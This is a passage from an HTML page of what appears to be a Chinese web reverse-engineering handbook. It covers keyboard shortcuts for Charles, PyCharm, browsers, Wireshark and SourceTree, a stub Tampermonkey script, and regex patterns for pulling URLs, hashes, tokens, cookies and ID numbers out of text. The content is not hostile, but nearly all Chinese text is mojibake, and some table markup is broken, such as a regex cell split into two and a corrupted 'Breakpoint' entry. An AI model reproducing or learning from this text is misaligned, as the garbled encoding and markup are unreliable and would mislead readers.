            <td><code>F5</code></td>
            <td>åˆ·æ–°ä¼šè¯åˆ—è¡¨</td>
          </tr>
          <tr>
            <td><code>F2</code></td>
            <td>ä¸ºä¼šè¯æ·»åŠ æ³¨é‡Š</td>
          </tr>
          <tr>
            <td><code>Ctrl+X</code></td>
            <td>åˆ é™¤æ‰€æœ‰ä¼šè¯</td>
          </tr>
          <tr>
            <td><code>Ctrl+F</code></td>
            <td>æŸ¥æ‰¾ä¼šè¯</td>
          </tr>
          <tr>
            <td><code>Shift+Del</code></td>
            <td>åˆ é™¤é€‰ä¸­ä¼šè¯</td>
          </tr>
          <tr>
            <td><code>U</code></td>
            <td>è§£å‹ç¼©å“åº”</td>
          </tr>
          <tr>
            <td><code>D</code></td>
            <td>è§£ç é€‰ä¸­çš„æ–‡æœ¬</td>
          </tr>
          <tr>
            <td><code>B</code></td>
            <td>åœ¨Breaå‰kpoint</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="charles">Charles</h2>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Cmd+R</code> (Mac) / <code>Ctrl+R</code> (Win)</td>
            <td>å¼€å§‹/åœæ­¢å½•åˆ¶</td>
          </tr>
          <tr>
            <td><code>Cmd+K</code></td>
            <td>æ¸…ç©ºä¼šè¯</td>
          </tr>
          <tr>
            <td><code>Cmd+F</code></td>
            <td>æŸ¥æ‰¾</td>
          </tr>
          <tr>
            <td><code>Cmd+E</code></td>
            <td>å¯ç”¨/ç¦ç”¨æ–­ç‚¹</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="python-ide-pycharm">Python IDE (PyCharm)</h2>

      <h3 id="å¯¼èˆª">å¯¼èˆª</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+N</code></td>
            <td>æŸ¥æ‰¾ç±»</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+N</code></td>
            <td>æŸ¥æ‰¾æ–‡ä»¶</td>
          </tr>
          <tr>
            <td><code>Ctrl+B</code></td>
            <td>è·³è½¬åˆ°å®šä¹‰</td>
          </tr>
          <tr>
            <td><code>Ctrl+Alt+â†</code></td>
            <td>åé€€</td>
          </tr>
          <tr>
            <td><code>Ctrl+Alt+â†’</code></td>
            <td>å‰è¿›</td>
          </tr>
        </tbody>
      </table>

      <h3 id="ç¼–è¾‘-2">ç¼–è¾‘</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+D</code></td>
            <td>å¤åˆ¶è¡Œ</td>
          </tr>
          <tr>
            <td><code>Ctrl+Y</code></td>
            <td>åˆ é™¤è¡Œ</td>
          </tr>
          <tr>
            <td><code>Ctrl+/</code></td>
            <td>æ³¨é‡Š/å–æ¶ˆæ³¨é‡Š</td>
          </tr>
          <tr>
            <td><code>Ctrl+Alt+L</code></td>
            <td>æ ¼å¼åŒ–ä»£ç </td>
          </tr>
          <tr>
            <td><code>Ctrl+Space</code></td>
            <td>ä»£ç è¡¥å…¨</td>
          </tr>
        </tbody>
      </table>

      <h3 id="è°ƒè¯•-2">è°ƒè¯•</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Shift+F9</code></td>
            <td>è°ƒè¯•</td>
          </tr>
          <tr>
            <td><code>F8</code></td>
            <td>å•æ­¥è·³è¿‡</td>
          </tr>
          <tr>
            <td><code>F7</code></td>
            <td>å•æ­¥è¿›å…¥</td>
          </tr>
          <tr>
            <td><code>Shift+F8</code></td>
            <td>å•æ­¥è·³å‡º</td>
          </tr>
          <tr>
            <td><code>F9</code></td>
            <td>ç»§ç»­æ‰§è¡Œ</td>
          </tr>
          <tr>
            <td><code>Ctrl+F8</code></td>
            <td>åˆ‡æ¢æ–­ç‚¹</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="æµè§ˆå™¨é€šç”¨">æµè§ˆå™¨é€šç”¨</h2>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+T</code></td>
            <td>æ–°æ ‡ç­¾é¡µ</td>
          </tr>
          <tr>
            <td><code>Ctrl+W</code></td>
            <td>å…³é—­æ ‡ç­¾é¡µ</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+T</code></td>
            <td>é‡æ–°æ‰“å¼€å…³é—­çš„æ ‡ç­¾é¡µ</td>
          </tr>
          <tr>
            <td><code>Ctrl+Tab</code></td>
            <td>ä¸‹ä¸€ä¸ªæ ‡ç­¾é¡µ</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+Tab</code></td>
            <td>ä¸Šä¸€ä¸ªæ ‡ç­¾é¡µ</td>
          </tr>
          <tr>
            <td><code>Ctrl+L</code></td>
            <td>åœ°å€æ </td>
          </tr>
          <tr>
            <td><code>Ctrl+D</code></td>
            <td>æ·»åŠ ä¹¦ç­¾</td>
          </tr>
          <tr>
            <td><code>Ctrl+H</code></td>
            <td>å†å²è®°å½•</td>
          </tr>
          <tr>
            <td><code>Ctrl+J</code></td>
            <td>ä¸‹è½½è®°å½•</td>
          </tr>
          <tr>
            <td><code>F5</code></td>
            <td>åˆ·æ–°</td>
          </tr>
          <tr>
            <td><code>Ctrl+F5</code></td>
            <td>å¼ºåˆ¶åˆ·æ–°ï¼ˆæ¸…é™¤ç¼“å­˜ï¼‰</td>
          </tr>
          <tr>
            <td><code>Ctrl+U</code></td>
            <td>æŸ¥çœ‹æºä»£ç </td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+Delete</code></td>
            <td>æ¸…é™¤æµè§ˆæ•°æ®</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="wireshark">Wireshark</h2>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+E</code></td>
            <td>å¼€å§‹/åœæ­¢æ•è·</td>
          </tr>
          <tr>
            <td><code>Ctrl+W</code></td>
            <td>å…³é—­æ•è·</td>
          </tr>
          <tr>
            <td><code>Ctrl+R</code></td>
            <td>é‡æ–°åŠ è½½</td>
          </tr>
          <tr>
            <td><code>Ctrl+F</code></td>
            <td>æŸ¥æ‰¾æ•°æ®åŒ…</td>
          </tr>
          <tr>
            <td><code>Ctrl+G</code></td>
            <td>è·³è½¬åˆ°æ•°æ®åŒ…</td>
          </tr>
          <tr>
            <td><code>Ctrl+M</code></td>
            <td>æ ‡è®°æ•°æ®åŒ…</td>
          </tr>
          <tr>
            <td><code>Ctrl+B</code></td>
            <td>æŸ¥æ‰¾ä¸‹ä¸€ä¸ªæ ‡è®°</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="git-gui-sourcetree">Git GUI (SourceTree)</h2>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+1</code></td>
            <td>File Status</td>
          </tr>
          <tr>
            <td><code>Ctrl+2</code></td>
            <td>History</td>
          </tr>
          <tr>
            <td><code>Ctrl+3</code></td>
            <td>Search</td>
          </tr>
          <tr>
            <td><code>Ctrl+R</code></td>
            <td>Refresh</td>
          </tr>
          <tr>
            <td><code>Ctrl+P</code></td>
            <td>Push</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+P</code></td>
            <td>Pull</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="è‡ªå®šä¹‰å¿«æ·é”®å»ºè®®">è‡ªå®šä¹‰å¿«æ·é”®å»ºè®®</h2>

      <p>ä¸ºå¸¸ç”¨æ“ä½œè®¾ç½®å¿«æ·é”®å¯ä»¥å¤§å¹…æé«˜æ•ˆç‡ï¼š</p>

      <h3 id="chrome-snippets">Chrome Snippets</h3>

      <ol>
        <li>DevTools â†’ Sources â†’ Snippets</li>
        <li>åˆ›å»ºå¸¸ç”¨ Hook è„šæœ¬</li>
        <li>å³é”® â†’ &#8220;Run&#8221; æˆ–æŒ‰ <code>Ctrl+Enter</code></li>
      </ol>

      <h3 id="tampermonkey">Tampermonkey</h3>

      <p>è®¾ç½®å¿«æ·é”®æ‰§è¡Œç”¨æˆ·è„šæœ¬ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ==UserScript==</span>
<span class="c1">// @name         My Hook Script</span>
<span class="c1">// @grant        GM_registerMenuCommand</span>
<span class="c1">// ==/UserScript==</span>

<span class="nx">GM_registerMenuCommand</span><span class="p">(</span><span class="s2">&quot;Execute Hook&quot;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Your hook code</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ğŸ“š ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#02-Tooling-browser-devtools">Chrome DevTools</a></li>
        <li><a href="#02-Tooling-burp-suite-guide">Burp Suite</a></li>
        <li><a href="#08-Cheat-Sheets-common-commands">å¸¸ç”¨å‘½ä»¤</a></li>
      </ul>

    </div>

    <div class="section" id="08-Cheat-Sheets-regex-patterns">
      <h2>66. Regex Patterns</h2>
      <h1 id="æ­£åˆ™è¡¨è¾¾å¼é€ŸæŸ¥è¡¨">æ­£åˆ™è¡¨è¾¾å¼é€ŸæŸ¥è¡¨</h1>

      <h2 id="å¸¸ç”¨å…ƒå­—ç¬¦">å¸¸ç”¨å…ƒå­—ç¬¦</h2>

      <table>
        <thead>
          <tr>
            <th>å…ƒå­—ç¬¦</th>
            <th>è¯´æ˜</th>
            <th>ç¤ºä¾‹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>.</code></td>
            <td>ä»»æ„å•ä¸ªå­—ç¬¦ï¼ˆé™¤æ¢è¡Œï¼‰</td>
            <td><code>a.c</code> åŒ¹é… <code>abc</code>, <code>a1c</code></td>
          </tr>
          <tr>
            <td><code>*</code></td>
            <td>0æ¬¡æˆ–å¤šæ¬¡</td>
            <td><code>ab*</code> åŒ¹é… <code>a</code>, <code>ab</code>, <code>abb</code></td>
          </tr>
          <tr>
            <td><code>+</code></td>
            <td>1æ¬¡æˆ–å¤šæ¬¡</td>
            <td><code>ab+</code> åŒ¹é… <code>ab</code>, <code>abb</code> (ä¸åŒ¹é…<code>a</code>)</td>
          </tr>
          <tr>
            <td><code>?</code></td>
            <td>0æ¬¡æˆ–1æ¬¡</td>
            <td><code>ab?</code> åŒ¹é… <code>a</code>, <code>ab</code></td>
          </tr>
          <tr>
            <td><code>^</code></td>
            <td>è¡Œé¦–</td>
            <td><code>^hello</code> åŒ¹é…è¡Œé¦–çš„hello</td>
          </tr>
          <tr>
            <td><code>$</code></td>
            <td>è¡Œå°¾</td>
            <td><code>world$</code> åŒ¹é…è¡Œå°¾çš„world</td>
          </tr>
          <tr>
            <td><code>\</code></td>
            <td>è½¬ä¹‰å­—ç¬¦</td>
            <td><code>\.</code> åŒ¹é…ç‚¹å·</td>
          </tr>
          <tr>
            <td><code>|</code></td>
            <td>æˆ–</td>
            <td>`cat</td>
            <td>dog` åŒ¹é…catæˆ–dog</td>
          </tr>
          <tr>
            <td><code>[]</code></td>
            <td>å­—ç¬¦é›†</td>
            <td><code>[abc]</code> åŒ¹é…aæˆ–bæˆ–c</td>
          </tr>
          <tr>
            <td><code>[^]</code></td>
            <td>å¦å®šå­—ç¬¦é›†</td>
            <td><code>[^abc]</code> ä¸åŒ¹é…a,b,c</td>
          </tr>
          <tr>
            <td><code>()</code></td>
            <td>åˆ†ç»„</td>
            <td><code>(ab)+</code> åŒ¹é…ab, abab</td>
          </tr>
        </tbody>
      </table>

      <h2 id="é¢„å®šä¹‰å­—ç¬¦ç±»">é¢„å®šä¹‰å­—ç¬¦ç±»</h2>

      <table>
        <thead>
          <tr>
            <th>å­—ç¬¦ç±»</th>
            <th>ç­‰ä»·äº</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>\d</code></td>
            <td><code>[0-9]</code></td>
            <td>æ•°å­—</td>
          </tr>
          <tr>
            <td><code>\D</code></td>
            <td><code>[^0-9]</code></td>
            <td>éæ•°å­—</td>
          </tr>
          <tr>
            <td><code>\w</code></td>
            <td><code>[a-zA-Z0-9_]</code></td>
            <td>å•è¯å­—ç¬¦</td>
          </tr>
          <tr>
            <td><code>\W</code></td>
            <td><code>[^a-zA-Z0-9_]</code></td>
            <td>éå•è¯å­—ç¬¦</td>
          </tr>
          <tr>
            <td><code>\s</code></td>
            <td><code>[ \t\n\r\f\v]</code></td>
            <td>ç©ºç™½å­—ç¬¦</td>
          </tr>
          <tr>
            <td><code>\S</code></td>
            <td><code>[^ \t\n\r\f\v]</code></td>
            <td>éç©ºç™½å­—ç¬¦</td>
          </tr>
        </tbody>
      </table>

      <h2 id="web-é€†å‘å¸¸ç”¨æ¨¡å¼">Web é€†å‘å¸¸ç”¨æ¨¡å¼</h2>

      <h3 id="url-åŒ¹é…">URL åŒ¹é…</h3>

      <pre><code># å®Œæ•´ URL
https?://[\w\-\.]+(/[\w\-\./?%&amp;=]*)?

# æå–åŸŸå
https?://([^/]+)

# æå–è·¯å¾„
https?://[^/]+(/[^?]+)

# æå–æŸ¥è¯¢å‚æ•°
[?&amp;]([^=]+)=([^&amp;]+)

# æå–æ‰€æœ‰ URL (å®½æ¾)
https?://[^\s]+
</code></pre>

      <p><strong>Python ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>

<span class="n">text</span> <span class="o">=</span> <span class="s2">&quot;Visit https://example.com/api?key=value and http://test.com&quot;</span>
<span class="n">urls</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;https?://[^\s]+&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
<span class="c1"># [&#39;https://example.com/api?key=value&#39;, &#39;http://test.com&#39;]</span>
</code></pre>
      </div>

      <h3 id="åŠ å¯†ç‰¹å¾">åŠ å¯†ç‰¹å¾</h3>

      <pre><code># MD5 (32ä½åå…­è¿›åˆ¶)
[a-f0-9]{32}

# SHA1 (40ä½)
[a-f0-9]{40}

# SHA256 (64ä½)
[a-f0-9]{64}

# Base64
[A-Za-z0-9+/]{4,}={0,2}

# JWT Token
eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+

# UUID
[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}
</code></pre>

      <p><strong>JavaScript ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">md5Pattern</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/[a-f0-9]{32}/g</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">md5Hashes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">text</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">md5Pattern</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="api-å“åº”æå–">API å“åº”æå–</h3>

      <pre><code># JSON å­—ç¬¦ä¸²å€¼
"([^"]+)"\s*:\s*"([^"]+)"

# æå– token
["']token["']\s*:\s*["']([^"']+)["']

# æå–æ•°å­—ID
["']id["']\s*:\s*(\d+)

# æå–æ‰€æœ‰é”®å€¼å¯¹
["'](\w+)["']\s*:\s*["']?([^,"']+)["']?
</code></pre>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="n">response</span> <span class="o">=</span> <span class="s1">&#39;{&quot;token&quot;:&quot;abc123&quot;,&quot;user_id&quot;:12345}&#39;</span>

<span class="c1"># æå– token</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&quot;token&quot;\s*:\s*&quot;([^&quot;]+)&quot;&#39;</span><span class="p">,</span> <span class="n">response</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="c1"># &#39;abc123&#39;</span>
</code></pre>
      </div>

      <h3 id="cookie-æå–">Cookie æå–</h3>

      <pre><code># æå–æ‰€æœ‰ Cookie
([^=]+)=([^;]+)

# æå–ç‰¹å®š Cookie
session_id=([^;]+)

# æå– Cookie å±æ€§
;\s*(\w+)=([^;]+)
</code></pre>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="n">cookie_str</span> <span class="o">=</span> <span class="s2">&quot;session_id=abc123; user=admin; expires=Wed, 21 Oct 2025&quot;</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;([^=]+)=([^;]+)&#39;</span><span class="p">,</span> <span class="n">cookie_str</span><span class="p">))</span>
<span class="c1"># {&#39;session_id&#39;: &#39;abc123&#39;, &#39;user&#39;: &#39;admin&#39;, &#39;expires&#39;: &#39;Wed, 21 Oct 2025&#39;}</span>
</code></pre>
      </div>

      <h3 id="javascript-ä»£ç æ¨¡å¼">JavaScript ä»£ç æ¨¡å¼</h3>

      <pre><code># å‡½æ•°å®šä¹‰
function\s+(\w+)\s*\([^)]*\)

# å˜é‡å£°æ˜
(var|let|const)\s+(\w+)\s*=\s*([^;]+)

# å­—ç¬¦ä¸²å­—é¢é‡
["']([^"']+)["']

# æ•°å­—å­—é¢é‡
\b\d+\.?\d*\b

# æ³¨é‡Š
//.*$|/\*[\s\S]*?\*/
</code></pre>

      <h3 id="æ‰‹æœºå·é‚®ç®±">æ‰‹æœºå·/é‚®ç®±</h3>

      <pre><code># ä¸­å›½æ‰‹æœºå·
1[3-9]\d{9}

# é‚®ç®±
[\w\.-]+@[\w\.-]+\.\w+

# IPv4
\b(?:\d{1,3}\.){3}\d{1,3}\b

# èº«ä»½è¯å·
[1-9]\d{5}(18|19|20)\d{2}(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d{3}[\dXx]
</code></pre>

      <h2 id="javascript-ä¸­ä½¿ç”¨">JavaScript ä¸­ä½¿ç”¨</h2>

      <h3 id="åŸºç¡€ç”¨æ³•">åŸºç¡€ç”¨æ³•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">pattern</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">/pattern/flags;</span>

<span class="c1">// å¸¸ç”¨æ–¹æ³•</span>
<span class="nx">pattern</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span><span class="w">           </span><span class="c1">// è¿”å› true/false</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">pattern</span><span class="p">)</span><span class="w">          </span><span class="c1">// è¿”å›åŒ¹é…æ•°ç»„</span>
<span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">pattern</span><span class="p">,</span><span class="w"> </span><span class="nx">replacement</span><span class="p">)</span>
<span class="nx">pattern</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span><span class="w">           </span><span class="c1">// è¿”å›è¯¦ç»†åŒ¹é…ä¿¡æ¯</span>
</code></pre>
      </div>

      <h3 id="flags-æ ‡å¿—">Flags (æ ‡å¿—)</h3>

      <table>
        <thead>
          <tr>
            <th>Flag</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>g</code></td>
            <td>å…¨å±€åŒ¹é…</td>
          </tr>
          <tr>
            <td><code>i</code></td>
            <td>å¿½ç•¥å¤§å°å†™</td>
          </tr>
          <tr>
            <td><code>m</code></td>
            <td>å¤šè¡Œæ¨¡å¼</td>
          </tr>
          <tr>
            <td><code>s</code></td>
            <td>dotAll æ¨¡å¼ï¼ˆ.åŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼‰</td>
          </tr>
          <tr>
            <td><code>u</code></td>
            <td>Unicode æ¨¡å¼</td>
          </tr>
          <tr>
            <td><code>y</code></td>
            <td>ç²˜æ€§åŒ¹é…</td>
          </tr>
        </tbody>
      </table>

      <h3 id="ç¤ºä¾‹">ç¤ºä¾‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æå–æ‰€æœ‰é“¾æ¥</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">html</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&lt;a href=&quot;/page1&quot;&gt;Link&lt;/a&gt;&lt;a href=&quot;/page2&quot;&gt;Link2&lt;/a&gt;&#39;</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">links</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">html</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/href=&quot;([^&quot;]+)&quot;/g</span><span class="p">);</span>
<span class="c1">// [&#39;href=&quot;/page1&quot;&#39;, &#39;href=&quot;/page2&quot;&#39;]</span>

<span class="c1">// åªæå– href å€¼</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">hrefValues</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[...</span><span class="nx">html</span><span class="p">.</span><span class="nx">matchAll</span><span class="p">(</span><span class="sr">/href=&quot;([^&quot;]+)&quot;/g</span><span class="p">)]</span>
<span class="w">    </span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">m</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">m</span><span class="p">[</span><span class="mf">1</span><span class="p">]);</span>
<span class="c1">// [&#39;/page1&#39;, &#39;/page2&#39;]</span>
</code></pre>
      </div>

      <h2 id="python-ä¸­ä½¿ç”¨">Python ä¸­ä½¿ç”¨</h2>

      <h3 id="re-æ¨¡å—">re æ¨¡å—</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>

<span class="c1"># ç¼–è¯‘æ­£åˆ™ï¼ˆæé«˜æ€§èƒ½ï¼‰</span>
<span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;pattern&#39;</span><span class="p">)</span>

<span class="c1"># å¸¸ç”¨æ–¹æ³•</span>
<span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">string</span><span class="p">)</span>      <span class="c1"># æŸ¥æ‰¾ç¬¬ä¸€ä¸ªåŒ¹é…</span>
<span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">string</span><span class="p">)</span>     <span class="c1"># æŸ¥æ‰¾æ‰€æœ‰åŒ¹é…</span>
<span class="n">re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">string</span><span class="p">)</span>    <span class="c1"># è¿”å›è¿­ä»£å™¨</span>
<span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">repl</span><span class="p">,</span> <span class="n">string</span><span class="p">)</span>   <span class="c1"># æ›¿æ¢</span>
<span class="n">re</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">string</span><span class="p">)</span>       <span class="c1"># åˆ†å‰²</span>
</code></pre>
      </div>

      <h3 id="flags">Flags</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span>  <span class="c1"># æˆ– re.I  - å¿½ç•¥å¤§å°å†™</span>
<span class="n">re</span><span class="o">.</span><span class="n">MULTILINE</span>   <span class="c1"># æˆ– re.M  - å¤šè¡Œæ¨¡å¼</span>
<span class="n">re</span><span class="o">.</span><span class="n">DOTALL</span>      <span class="c1"># æˆ– re.S  - .åŒ¹é…æ‰€æœ‰å­—ç¬¦</span>
<span class="n">re</span><span class="o">.</span><span class="n">VERBOSE</span>     <span class="c1"># æˆ– re.X  - è¯¦ç»†æ¨¡å¼ï¼ˆå¯ä»¥å†™æ³¨é‡Šï¼‰</span>
</code></pre>
      </div>

      <h3 id="ç¤ºä¾‹-2">ç¤ºä¾‹</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æå–åŠ å¯†å‚æ•°</span>
<span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;sign=md5(&quot;user&quot;+password+&quot;secret&quot;)&#39;</span>
<span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;sign=(\w+)\(&quot;([^&quot;]+)&quot;\+(\w+)\+&quot;([^&quot;]+)&quot;\)&#39;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
<span class="k">if</span> <span class="n">match</span><span class="p">:</span>
    <span class="n">algorithm</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># &#39;md5&#39;</span>
    <span class="n">param1</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>      <span class="c1"># &#39;user&#39;</span>
    <span class="n">param2</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>      <span class="c1"># &#39;password&#39;</span>
    <span class="n">secret</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>      <span class="c1"># &#39;secret&#39;</span>
</code></pre>
      </div>

      <h2 id="é«˜çº§æŠ€å·§">é«˜çº§æŠ€å·§</h2>

      <h3 id="éè´ªå©ªåŒ¹é…">éè´ªå©ªåŒ¹é…</h3>

      <pre><code># è´ªå©ªï¼ˆå°½å¯èƒ½å¤šï¼‰
.*

# éè´ªå©ªï¼ˆå°½å¯èƒ½å°‘ï¼‰
.*?

# ç¤ºä¾‹
&lt;div&gt;content&lt;/div&gt;&lt;div&gt;more&lt;/div&gt;

# è´ªå©ª: &lt;div&gt;.*&lt;/div&gt;
# åŒ¹é…: &lt;div&gt;content&lt;/div&gt;&lt;div&gt;more&lt;/div&gt;

# éè´ªå©ª: &lt;div&gt;.*?&lt;/div&gt;
# åŒ¹é…: &lt;div&gt;content&lt;/div&gt;
</code></pre>

      <h3 id="å‰ç»å’Œåé¡¾">å‰ç»å’Œåé¡¾</h3>

      <pre><code># æ­£å‘å‰ç» (?=pattern)
\w+(?=\d)       # åŒ¹é…åé¢è·Ÿæ•°å­—çš„å•è¯

# è´Ÿå‘å‰ç» (?!pattern)
\w+(?!\d)       # åŒ¹é…åé¢ä¸è·Ÿæ•°å­—çš„å•è¯

# æ­£å‘åé¡¾ (?&lt;=pattern)
(?&lt;=\$)\d+      # åŒ¹é…å‰é¢æœ‰$ç¬¦å·çš„æ•°å­—

# è´Ÿå‘åé¡¾ (?&lt;!pattern)
(?&lt;!\$)\d+      # åŒ¹é…å‰é¢æ²¡æœ‰$ç¬¦å·çš„æ•°å­—
</code></pre>

      <h3 id="å‘½ååˆ†ç»„">å‘½ååˆ†ç»„</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Python</span>
<span class="n">pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;(?P&lt;year&gt;\d</span><span class="si">{4}</span><span class="s1">)-(?P&lt;month&gt;\d</span><span class="si">{2}</span><span class="s1">)-(?P&lt;day&gt;\d</span><span class="si">{2}</span><span class="s1">)&#39;</span>
<span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="s1">&#39;2024-01-15&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s1">&#39;year&#39;</span><span class="p">))</span>   <span class="c1"># &#39;2024&#39;</span>
<span class="nb">print</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="s1">&#39;month&#39;</span><span class="p">))</span>  <span class="c1"># &#39;01&#39;</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// JavaScript</span>
